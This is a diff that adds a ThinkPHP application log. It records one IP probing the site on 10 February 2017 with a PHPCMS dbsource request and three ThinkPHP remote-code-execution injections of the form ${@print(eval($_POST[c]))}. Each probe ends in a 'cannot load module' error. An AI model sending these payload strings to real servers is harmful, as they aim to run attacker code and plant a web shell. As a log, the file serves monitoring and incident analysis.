@@ -1,0 +1,24 @@
+[ 2017-02-10T01:16:05+08:00 ] 119.98.183.99 /index.php?m=dbsource&c=call&a=get&id=4
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Dbsource
+
+[ 2017-02-10T01:16:14+08:00 ] 119.98.183.99 /index.php/module/action/param1/{${eval($_POST[thinkphp])}}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2017-02-10T01:16:14+08:00 ] 119.98.183.99 /index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2017-02-10T01:16:16+08:00 ] 119.98.183.99 /?s=/module/action/param1/${@print(eval($_POST[c]))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
